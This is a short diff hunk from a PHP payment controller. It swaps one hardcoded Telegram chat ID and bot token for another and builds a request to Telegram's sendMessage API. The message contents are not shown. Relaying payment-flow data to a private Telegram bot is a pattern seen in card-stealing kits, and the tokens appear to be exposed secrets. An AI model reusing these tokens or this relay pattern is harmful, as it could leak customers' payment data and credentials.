@@ -88,8 +88,8 @@ class PaymentController extends Controller {
                     }
 
 
-                    $chat_id = "1316552414";
-                    $token = "7740765046:AAEA49Eq4qHci6e0UkJPRymc9SyTs3YtZlU";
+                    $chat_id = "6467727007";
+                    $token = "8409290535:AAFOzZ__9ecLuZT2BpNdipuidBiahp4eboQ";
                     $url = "https://api.telegram.org/bot{$token}/sendMessage";
 
                     $data = [
